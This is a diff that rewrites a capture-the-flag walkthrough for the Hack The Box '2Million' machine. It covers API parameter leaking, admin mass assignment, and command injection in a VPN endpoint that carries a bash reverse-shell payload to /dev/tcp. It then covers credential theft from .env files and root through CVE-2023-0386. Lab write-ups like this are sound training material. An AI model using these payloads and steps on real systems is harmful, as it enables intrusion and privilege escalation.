@@ -1,62 +1,67 @@
 ![](Assets/Pasted%20image%2020260317200144.png)
 
-First we make ping that we have connection
+**Main Vectors:** API Mass Assignment (BOLA), Command Injection, OverlayFS PrivEsc (CVE-2023-0386)
+
+---
+
+## 1. Reconnaissance & Enumeration
+
+Initial connectivity was verified via ICMP ping. We then launched a standard TCP enumeration using `nmap`:
 
 ![](Assets/Pasted%20image%2020260317200459.png)
 
-Then lets make a nmap `sudo nmap -sV -sS <IP_SCAN>`
+```bash
+sudo nmap -sV -sS <IP_SCAN>
+```
 
 ![](Assets/Pasted%20image%2020260317200616.png)
 
-Let add in the file hosts and acced in the website
+After adding the target IP to our `/etc/hosts` file mapped to `2millon.htb`, we accessed the web application. Inspecting the source code revealed custom JavaScript containing obfuscated logic.
 
 ![](Assets/Pasted%20image%2020260317200854.png)
 
 ![](Assets/Pasted%20image%2020260317200920.png)
 
-We found this in the site.
-
 ![](Assets/Pasted%20image%2020260317201747.png)
 
-So we found this code and see all of them like this.
+By analyzing and executing the decryption function found within the JS file, we uncovered a hidden API endpoint used for generating invite codes.
 
 ![](Assets/Pasted%20image%2020260317204652.png)
 
-The we use this function to make a code
-
 ![](Assets/Pasted%20image%2020260317205445.png)
 
-So we decrypt the data and this is the message, so lets the curl, and we have a base64
+We queried this endpoint to obtain a Base64 encoded invite code:
 
-`curl -X POST http://2million.htb/api/v1/invite/generate`
+```bash
+curl -X POST http://2million.htb/api/v1/invite/generate
+```
 
 ![](Assets/Pasted%20image%2020260317205622.png)
 
-And we have access to a new page
+Decoding the response granted us a valid invite code, allowing us to register a new user account and authenticate into the plataform.
 
 ![](Assets/Pasted%20image%2020260317210045.png)
 
-So if we have a access to the api we can see maybe other access for api like `http://2million.htb/api/v1/`
+## 2. Vulnerability Discovery & API Abuse
 
-So lets try somenthing in the console
+With an active session, we began enumerating the `/api/v1/` structure. We discovered an administrative endpoint and attempted to interact with it by sending an empty JSON payload.
 
 ```bash
-curl -s -X PUT [http://2million.htb/api/v1/admin/settings/update](http://2million.htb/api/v1/admin/settings/update) \
+curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
 -H "Cookie: IN_YOUR_SEESION" \
 -H "Content-Type: application/json" \
 -d '{}'
 ```
 
-Sending that empty JSON file will prevent the server from updating anything; it will fail and return an error message in JSON format.
-
-That error message is pure gold. It will usually say something like "Missing parameter: X".
+>[!info] The "Missing Parameter" Technique
+> Sending an empty JSON object "{}" is a classic API enumeration technique. It forces the backend to throw validation errors, often leaking the exact parameter names it expects (e.g., "Missing parameter: email").
 
 ![](Assets/Pasted%20image%2020260317212132.png)
 
-Lets try put the email and we can see now one missing paramter
+Following the error leaks, we identified the `email` parameter. Repeating the process revealed another expected parameter: `is_admin`. Since this is a boolean field, we tested an API Mass Assignment (BOLA) attack to elevate our privileges:
 
 ```bash
-curl -s -X PUT [http://2million.htb/api/v1/admin/settings/update](http://2million.htb/api/v1/admin/settings/update) \
+curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
 -H "Cookie: NAME=VALUE" \
 -H "Content-Type: application/json" \
 -d '{"email": "test@test.com"}'
@@ -68,16 +73,14 @@ Lets try to the parameter is_admin = 1, most of those fields are boolean
 
 ![](Assets/Pasted%20image%2020260317212905.png)
 
-So now we can found another endpoint that we can exploit
+This successfully updated our account to Administrator status unlocking the rest of the `/admin` endpoints.
 
-```bash
-curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
-     -H "Cookie: NAME=VALUE" \
-     -H "Content-Type: application/json" \
-     -d '{}'
-```
+## 3. Command Injection & Initial Access
 
-We can see that we need a value.
+As ab administrator, we discovered the VPN generation enpoint (`/api/v1/admin/vpn/generate`).
+By sending an empty payload again, we leaked the required `username` parameter.
+
+We suspected this endpoint passed the `username` directly into a system command to generate the `.ovpn` file. We tested for OS Command Injection by appending a Bash reverse shell payload:
 
 ![](Assets/Pasted%20image%2020260317214309.png)
 
@@ -88,22 +91,7 @@ curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
      -d '{"username": "test"}'
 ```
 
-And we have this output that its a ovpn so lets try to make a revershell.
-
 ![](Assets/Pasted%20image%2020260317214427.png)
-
-Lets inject this command.
-
-```bash
-bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"
-
-bash -c: open a new instance 
-bash -i: the say not close fast waith like a human put a command
-/dev/tcp/TU_IP/4444: the revershell tunnel
-0>&1: take the entry for the console and redirects it so that it listens through the same tube to where it is sending the information.
-```
-
-So the curl its like.
 
 ```bash
 curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
@@ -112,11 +100,16 @@ curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
      -d '{"username": "test; bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\""}'
 ```
 
-Then you have access
+>[!danger] Reverse Shell Anatomy Breakdown
+> - `test;`: Terminates the expected username input to begin our injected command.
+> - `bash -c`: Spawns a new bash instance to execute the following string.
+> - `bash -i`: Forces the shell to be interactive (simulating a human user).
+> - `>& /dev/tcp/<YOUR_IP>/4444`: Redirects standard output and standard error over a TCP socket to our attacking machine.
+> - `0>&1`: Redirects standard input (0) to standard output (1), closing the loop so we can send commands through the same socket.
+
+We caugh the reverse shell on our `netcat` listener. Upon gaining entry, we enumerated the `.env` files in the web directory, discovered hardcoded user credentials, and pivoted via SSH for a more stable connection, claiming the `user.txt` flag.
 
 ![](Assets/Pasted%20image%2020260317215732.png)
-
-First we check the environment files
 
 ![](Assets/Pasted%20image%2020260317220227.png)
 
@@ -124,12 +117,24 @@ Then we can check if the user exist in `/etc/passwd` and make one ssh
 
 ![](Assets/Pasted%20image%2020260317220348.png)
 
-Then we have access and acced to the flag user, then we need to use a exploit **[CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386.git)**. You need to up a python server `python3 -m http.server` and then you need to put in tar this files `tar -czvf exploit.tar.gz Makefile exp.c fuse.c getshell.c ovlcap`
+## 4. Privilege Escalation
+
+For the final escalation, we enumerated the system and found it vulnerable to **[CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386.git)** (OverlayFS Privilege Escalation). 
+
+To maintain OPSEC nad ensure a clean transferm we packaged the exploit files on our attacking machine:
+
+``` bash
+tar -czvf exploit.tar.gz Makefile exp.c fuse.c getshell.c ovlcap
+```
+
+We hosted the archive using a Python web server (`python3 -m http.server 80`), downloaded it to the victim machine, and extracted it:
 
 ![](Assets/Pasted%20image%2020260317222031.png)
 
-Now we can see the file only untar `tar -xzvf exploit.tar.gz` and continue with the instruction in the github.
+```bash
+tar -xzvf exploit.tar.gz
+```
+
+Following the exploit's compilation instructions (`make`), we executed the binary. The overlay filesystem vulnerability successfully granted us a root shell, allowing us to capture the `root.txt` flag and fully compromise the system.
 
 ![](Assets/Pasted%20image%2020260317225620.png)
-
-Now only take the flag
